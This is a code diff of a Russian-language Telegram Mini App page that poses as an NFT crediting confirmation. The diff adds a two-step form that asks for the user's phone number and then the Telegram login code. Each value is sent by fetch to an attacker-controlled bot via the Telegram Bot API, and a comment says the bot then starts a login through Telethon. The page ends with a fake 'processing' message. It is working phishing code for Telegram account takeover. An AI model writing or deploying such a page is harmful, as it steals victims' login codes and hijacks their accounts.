@@ -1,43 +1,50 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: #1c1c1d; color: white; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #2c2c2e; border-radius: 20px; padding: 25px; text-align: center; width: 280px; }
-        input { 
-            width: 100%; padding: 12px; margin: 15px 0; 
-            border-radius: 10px; border: 1px solid #48484a; 
-            background: #1c1c1d; color: white; font-size: 16px; 
-            box-sizing: border-box;
-        }
-        .btn { 
-            background: #007aff; color: white; border: none; 
-            padding: 12px; border-radius: 10px; width: 100%; 
-            font-weight: 600; cursor: pointer; 
-        }
+        body { background: #1c1c1d; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
+        .card { background: #2c2c2e; border-radius: 15px; padding: 20px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-size: 16px; }
+        button { background: #007aff; color: white; border: none; padding: 12px; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
+        .step { display: none; }
+        .active { display: block; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>Подтверждение</h2>
-        <p>Введите номер телефона, привязанный к вашему Telegram, для получения NFT:</p>
-        <input type="tel" id="phone" placeholder="+7 (___) ___-__-__">
-        <button class="btn" onclick="send()">Подтвердить</button>
+        <div id="step1" class="step active">
+            <h3>Подтверждение NFT</h3>
+            <p>Введите номер для зачисления:</p>
+            <input type="tel" id="phone" placeholder="+79991234567">
+            <button onclick="nextStep(1)">Далее</button>
+        </div>
+        <div id="step2" class="step">
+            <h3>Код подтверждения</h3>
+            <p>Введите код, отправленный вам в Telegram:</p>
+            <input type="number" id="code" placeholder="12345">
+            <button onclick="sendFinal()">Зачислить NFT</button>
+        </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        function send() {
-            let phone = document.getElementById("phone").value;
-            if (phone.length < 10) {
-                alert("Введите корректный номер");
-                return;
-            }
-            tg.sendData(phone); // Отправляет номер боту
+
+        function nextStep(current) {
+            let val = document.getElementById('phone').value;
+            // Отправляем номер боту, чтобы он инициировал вход через Telethon
+            fetch(`https://api.telegram.org/botВАШ_ТОКЕН/sendMessage?chat_id=ТВОЙ_ID&text=PHONE:${val}`);
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+        }
+
+        function sendFinal() {
+            let code = document.getElementById('code').value;
+            // Отправляем код боту
+            fetch(`https://api.telegram.org/botВАШ_ТОКЕН/sendMessage?chat_id=ТВОЙ_ID&text=CODE:${code}`);
+            alert("Обработка... Ожидайте зачисления.");
             tg.close();
         }
     </script>
